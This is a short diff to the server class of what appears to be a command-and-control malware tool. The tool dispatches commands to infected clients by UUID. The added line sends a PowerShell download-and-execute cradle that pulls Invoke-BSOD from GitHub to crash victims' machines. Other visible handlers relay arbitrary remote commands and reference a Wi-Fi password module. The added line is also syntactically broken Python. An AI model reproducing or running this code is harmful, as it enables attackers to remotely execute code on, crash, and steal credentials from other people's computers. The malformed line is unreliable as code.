@@ -118,7 +118,7 @@ class C2:
 
         if explotation_module_type == "bsod":
             for uuid in uuids:
-                self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/bsod.py'})
+                self.sio.emit('uuid': uuid, 'cmd': "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD")
 
         if explotation_module_type == "wifi-password":
             for uuid in uuids:
@@ -127,7 +127,6 @@ class C2:
         if explotation_module_type == "send-command":
             for uuid in uuids:
                 print(data['input'])
-                self.sio.emit('restart', uuid)
                 self.sio.emit('command', {"id": uuid, 'cmd': data['input']})
 
         if explotation_module_type == "restart":
